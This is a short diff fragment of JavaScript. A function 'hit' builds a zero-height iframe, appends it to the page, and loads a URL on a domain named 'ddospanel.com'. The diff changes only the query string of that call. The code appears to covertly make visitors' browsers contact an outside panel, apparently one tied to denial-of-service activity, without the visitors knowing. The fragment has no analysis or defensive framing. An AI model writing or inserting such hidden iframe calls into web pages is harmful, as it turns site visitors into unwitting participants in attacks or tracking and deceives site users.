@@ -7,4 +7,4 @@ function hit(url) {
         ifrm.style.height = "0px";
         document.body.appendChild(ifrm);
 }
-hit("http://kral.ddospanel.com/cek.php?press");
+hit("http://kral.ddospanel.com/cek.php?pressim");
